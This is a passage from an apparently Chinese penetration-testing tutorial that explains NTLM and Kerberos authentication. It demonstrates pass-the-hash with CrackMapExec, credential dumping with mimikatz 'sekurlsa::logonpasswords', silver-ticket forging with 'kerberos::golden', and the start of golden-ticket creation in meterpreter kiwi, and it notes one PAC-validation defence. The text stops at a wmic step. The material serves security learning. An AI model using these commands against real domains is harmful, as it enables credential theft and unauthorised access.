&lt;li&gt;2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。&lt;/li&gt;
&lt;li&gt;3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。&lt;/p&gt;
&lt;p&gt;验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。&lt;/p&gt;
&lt;p&gt;使用另外一种方式解读：&lt;/p&gt;
&lt;p&gt;1.Server接收到Client发送的用户名后，判断本地账户列 表是否有用户名share_user&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果没有，返回认证失败&lt;/li&gt;
&lt;li&gt;如果有，生成Chanllenge，并且从本地查找share_user对 应的NTLM Hash，使用NTLM Hash加密Chanllenge，生成一 个Net-NTLM Hash存在内存中，并将Chanllenge发送给Client。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2.Client接收到Chanllenge后，将自己提供的share_user的密码转换为NTLM Hash，使用NTLM Hash加密Chanllenge， 这个结果叫Response，表现形式是Net-NTLM Hash，最后将Response发送给Server。&lt;/p&gt;
&lt;p&gt;3.Server接收到Client发送的Response，将Response与之 前的Net-NTLM Hash进行比较，如果相等，则认证通过。&lt;/p&gt;
&lt;p&gt;注意:&lt;/p&gt;
&lt;p&gt;1.Chanllenge是Server产生的一个16字节的随机数，每次认证都不同&lt;/p&gt;
&lt;p&gt;2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/01.png&#34;
	width=&#34;2808&#34;
	height=&#34;1470&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/01_huf217b9b7bacdc9603f20a9aaff7a4ce4_746852_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/01_huf217b9b7bacdc9603f20a9aaff7a4ce4_746852_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;NTLM 协议&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;191&#34;
		data-flex-basis=&#34;458px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;ntlm-v2协议&#34;&gt;NTLM V2协议&lt;/h3&gt;
&lt;p&gt;NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。&lt;/p&gt;
&lt;p&gt;下面细说一下有什么不同:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Challage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。&lt;/li&gt;
&lt;li&gt;Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;现在应该能够理解什么是NTLM、NTLM Hash、LM、LM Hash、Net NTLM Hash了吧？&lt;/p&gt;
&lt;h3 id=&#34;pass-the-hash&#34;&gt;Pass The Hash&lt;/h3&gt;
&lt;p&gt;在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，尤其是在域环境下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是哈希传递?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;哈希传递的作用?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又 想扩大战果的问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pass The Hash - 必要条件&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;哈希传递需要被认证的主机能够访问到服务器(废话)&lt;/li&gt;
&lt;li&gt;哈希传递需要被传递认证的用户名&lt;/li&gt;
&lt;li&gt;哈希传递需要被传递认证用户的NTLM Hash&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge⋯⋯&lt;/p&gt;
&lt;p&gt;其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。&lt;/p&gt;
&lt;p&gt;Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。&lt;/p&gt;
&lt;p&gt;Pass The Hash的工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Smbmap&lt;/li&gt;
&lt;li&gt;CrackMapExec&lt;/li&gt;
&lt;li&gt;Smbexec&lt;/li&gt;
&lt;li&gt;Metasploit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用CrackMapExec实现Hash传递：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SMB 192.168.3.5 445 LIYINGZHEA30B
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(domain:PAYLOADS) (signing:False) (SMBv1:True)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SMB 192.168.3.5 445 LIYINGZHEA30B
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(Pwn3d!)SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;0x02-kerberos域认证&#34;&gt;0x02 Kerberos域认证&lt;/h2&gt;
&lt;h3 id=&#34;active-directory活动目录概念&#34;&gt;Active Directory(活动目录)概念&lt;/h3&gt;
&lt;p&gt;Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务，当然，这个不在我们的讨论范围。&lt;/p&gt;
&lt;p&gt;活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Active Directory存储了有关网络对象的信息，并且让管理员和用 户能够轻松地查找和使用这些信息。Active Directory使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻 辑的分层组织。&lt;/li&gt;
&lt;li&gt;网络对象分为:用户、用户组、计算机、域、组织单位以及安全 策略等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;active-directory活动目录功能&#34;&gt;Active Directory(活动目录)功能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。&lt;/li&gt;
&lt;li&gt;用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮 件系统集成)、用户组管理、用户身份认证、用户授权管理等， 按省实施组管理策略。&lt;/li&gt;
&lt;li&gt;资源管理:管理打印机、文件共享服务等网络资源。&lt;/li&gt;
&lt;li&gt;桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特 征限制、网络连接限制、安全配置限制等。&lt;/li&gt;
&lt;li&gt;应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。&lt;/p&gt;
&lt;p&gt;这个中间就需要Kerberos认证协议来验证网络对象间的权限。&lt;/p&gt;
&lt;h3 id=&#34;域认证体系---kerbroes&#34;&gt;域认证体系 - Kerbroes&lt;/h3&gt;
&lt;p&gt;Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客 户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不 依赖于主机操作系统的认证，无需基于主机地址的信任，不要求 网络上所有主机的物理安全，并假定网络上传送的数据包可以被 任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享 密钥)执行认证服务的。&lt;/p&gt;
&lt;h3 id=&#34;域认证所参与的角色-三只狗头&#34;&gt;域认证所参与的角色 (三只狗头)&lt;/h3&gt;
&lt;p&gt;Kerberos的标志是三只狗头，狗头分别代表以下角色：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Client&lt;/li&gt;
&lt;li&gt;Server&lt;/li&gt;
&lt;li&gt;KDC(Key Distribution Center) = DC(Domain Controller)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Kerberos认证协议的基础概念：&lt;/p&gt;
&lt;p&gt;票据（Ticket）：是网络对象互相访问的凭证。 TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证的存在。&lt;/p&gt;
&lt;p&gt;KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Authentication Service: 为client生成TGT的服务&lt;/li&gt;
&lt;li&gt;Ticket Granting Service: 为client生成某个服务的ticket&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外还需要介绍一个类似于本机SAM的一个数据库：AD，全称叫account database，存储所有client的白名单，只有存 在于白名单的client才能顺利申请到TGT。&lt;/p&gt;
&lt;p&gt;从物理层面看，AD与KDC均为域控制器(Domain Controller)。&lt;/p&gt;
&lt;h3 id=&#34;域认证粗略流程&#34;&gt;域认证粗略流程&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;client向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的， 也就是白名单黑名单的说法。这就是AS服务完成的工作，通过 在AD中存储黑名单和白名单来区分client。成功后，返回AS返 回TGT给client。&lt;/li&gt;
&lt;li&gt;client得到了TGT后，继续向kerberos请求，希望获取访问 server的权限。kerberos又得到了这个消息，这时候通过client 消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。&lt;/li&gt;
&lt;li&gt;client得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;域认证&#34;&gt;域认证&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/02.png&#34;
	width=&#34;2418&#34;
	height=&#34;1346&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/02_hue21858f158b24c107f383de2cd9b4cc0_387046_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/02_hue21858f158b24c107f383de2cd9b4cc0_387046_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;域认证&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;179&#34;
		data-flex-basis=&#34;431px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。&lt;/p&gt;
&lt;p&gt;KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Session Key用于客户端向TGS服务通信。&lt;/li&gt;
&lt;li&gt;域内所有网络对象的凭证都在AD中保存&lt;/li&gt;
&lt;li&gt;KDC中某个用户指的是krbtgt&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;数据结构：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/03.png&#34;
	width=&#34;2796&#34;
	height=&#34;1344&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/03_hu270860c828dfdf86566865d5c81a8c57_511181_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/03_hu270860c828dfdf86566865d5c81a8c57_511181_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;域认证&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;208&#34;
		data-flex-basis=&#34;499px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/04.png&#34;
	width=&#34;2772&#34;
	height=&#34;1518&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/04_hu3a7736d8e99872f1d360c31780968e2e_608333_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/04_hu3a7736d8e99872f1d360c31780968e2e_608333_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;域认证&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;182&#34;
		data-flex-basis=&#34;438px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket。&lt;/p&gt;
&lt;p&gt;Kerberos是一个假设网络环境不安全的情况下能够正常进行认证工作的协议。&lt;/p&gt;
&lt;p&gt;第一步中，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，如果有，我们就可以伪造黄金票据，这个是后话了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/05.png&#34;
	width=&#34;2580&#34;
	height=&#34;1472&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/05_hu740368a8b6a9adec6cd68b7e90c5052e_386314_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/05_hu740368a8b6a9adec6cd68b7e90c5052e_386314_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;域认证&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;175&#34;
		data-flex-basis=&#34;420px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;第二步客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。&lt;/p&gt;
&lt;p&gt;如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。&lt;/p&gt;
&lt;p&gt;KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。&lt;/p&gt;
&lt;p&gt;验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。&lt;/p&gt;
&lt;p&gt;Ticket组成如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/06.png&#34;
	width=&#34;2494&#34;
	height=&#34;1476&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/06_hu7b77a460e4d59147e086002e9f4602a7_230856_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/06_hu7b77a460e4d59147e086002e9f4602a7_230856_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;域认证&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;168&#34;
		data-flex-basis=&#34;405px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/07.png&#34;
	width=&#34;2716&#34;
	height=&#34;1430&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/07_hu902d3e981a4770ce647314136df6bc36_323522_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/07_hu902d3e981a4770ce647314136df6bc36_323522_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;域认证&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;189&#34;
		data-flex-basis=&#34;455px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ticket客户端无法解密&lt;/li&gt;
&lt;li&gt;服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp)&lt;/li&gt;
&lt;li&gt;比较时间长度&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;校验通过后，认证成功，该票据会一直存在客户端内存中。&lt;/p&gt;
&lt;h3 id=&#34;白银票据silver-tickets&#34;&gt;白银票据(Silver Tickets)&lt;/h3&gt;
&lt;p&gt;白银票据特点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.不需要与KDC进行交互&lt;/li&gt;
&lt;li&gt;2.需要目标服务的NTLM Hash&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在第三步认证中的Ticket的组成:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Ticket=Server Hash(Server Session Key+Client info+End Time) 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;伪造白银票据silver-tickets&#34;&gt;伪造白银票据(Silver Tickets)&lt;/h3&gt;
&lt;p&gt;首先需要导出Server Hash：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\files&amp;gt;mimikatz.exe &amp;#34;privilege::debug” &amp;#34;sekurlsa::logonpasswords&amp;#34; &amp;#34;exit&amp;#34; &amp;gt; log.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;伪造票据:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz “kerberos::golden /domain:&amp;lt;域名&amp;gt; /sid:&amp;lt;域 SID&amp;gt; /target:&amp;lt;目标服务器主机名&amp;gt; /service:&amp;lt;服务类型&amp;gt; /rc4:&amp;lt;NTLM Hash&amp;gt; /user:&amp;lt;用户名&amp;gt; /ptt&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Other：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;kerberos::list #列出票据&lt;/li&gt;
&lt;li&gt;kerberos::purge # 清除票据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据，也不能通过TGT申请。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;服务注释&lt;/th&gt;
&lt;th&gt;服务名&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;WMI&lt;/td&gt;
&lt;td&gt;HOST、RPCSS&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Powershell Remoteing&lt;/td&gt;
&lt;td&gt;HOST、HTTP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WinRM&lt;/td&gt;
&lt;td&gt;HOST、HTTP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Scheduled Tasks&lt;/td&gt;
&lt;td&gt;HOST&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;LDAP 、DCSync&lt;/td&gt;
&lt;td&gt;LDAP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Windows File Share (CIFS)&lt;/td&gt;
&lt;td&gt;CIFS&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Windows Remote ServerAdministration Tools&lt;/td&gt;
&lt;td&gt;RPCSS、LDAP、CIFS&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;白银票据silver-tickets演示&#34;&gt;白银票据(Silver Tickets)演示&lt;/h3&gt;
&lt;h3 id=&#34;白银票据silver-tickets防御&#34;&gt;白银票据(Silver Tickets)防御&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1.尽量保证服务器凭证不被窃取&lt;/li&gt;
&lt;li&gt;2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;开启方式:&lt;/p&gt;
&lt;p&gt;将注册表中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;中的&lt;code&gt;ValidateKdcPacSignature&lt;/code&gt;设置为1。&lt;/p&gt;
&lt;h3 id=&#34;黄金票据golden-tickets&#34;&gt;黄金票据(Golden Tickets)&lt;/h3&gt;
&lt;p&gt;黄金票据特点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.需要与DC通信&lt;/li&gt;
&lt;li&gt;2.需要krbtgt用户的hash&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;PS:这里的krbtgt hash就是之前讲的KDC Hash&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;黄金票据golden-tickets-msf-kiwi&#34;&gt;黄金票据(Golden Tickets)-MSF kiwi&lt;/h3&gt;
&lt;p&gt;使用meterpreter中的kiwi模块：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;load kiwi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;创建票据：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/08.png&#34;
	width=&#34;2804&#34;
	height=&#34;1484&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/08_huec0885b30aac55b84c136e8ff1e075ab_889975_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/08_huec0885b30aac55b84c136e8ff1e075ab_889975_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;黄金票据&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;188&#34;
		data-flex-basis=&#34;453px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;注入到内存：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/mljrguh0/09.png&#34;
	width=&#34;2822&#34;
	height=&#34;1314&#34;
	srcset=&#34;https://360rce.github.io/p/mljrguh0/09_huc885ad02c71994fd8b6f4c1e418536d8_1044338_480x0_resize_box_3.png 480w, https://360rce.github.io/p/mljrguh0/09_huc885ad02c71994fd8b6f4c1e418536d8_1044338_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;黄金票据&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;214&#34;
		data-flex-basis=&#34;515px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;使用wmic在目标服务器上创建一个进程：&lt;/p&gt;
